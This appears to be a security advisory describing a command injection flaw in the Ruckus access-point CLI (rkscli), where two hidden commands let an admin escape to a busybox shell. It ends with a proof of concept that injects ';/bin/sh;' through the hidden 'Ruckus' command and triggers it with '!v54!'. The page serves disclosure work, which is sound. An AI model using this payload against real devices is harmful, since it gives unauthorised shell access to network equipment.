title: 'Ruckus CLI (rkscli) jailbreak'
---
This is a command injection vulnerability via a crafted CLI command with admin privilege.

`/usr/bin/rkscli` is a CLI used by Ruckus for user interaction and run commands by their web interface. `rkscli` has a hidden CLI command `Ruckus` that writes a limited string to `/writable/etc/system/access`. `!v54!` is another hidden command. If `!v54!` do not receive any arguments it executes `/usr/sbin/sesame` with that content of  `/writable/etc/system/access`.

`Ruckus` command can write a command injection payload into `/writable/etc/system/access`. Then `!v54!` can execute this payload and this way, escape to `busybox` shell.

Information about the exploitation of the vulnerability can be found in our [36C3 talk](https://youtu.be/bmGtG55Zz1Q?t=1718).


## Proof Of Concept ##
Jail breaking Ruckus CLI using this exploit
```
rkscli: Ruckus <-input ";/bin/sh;"
grrrr

rkscli: !v54!
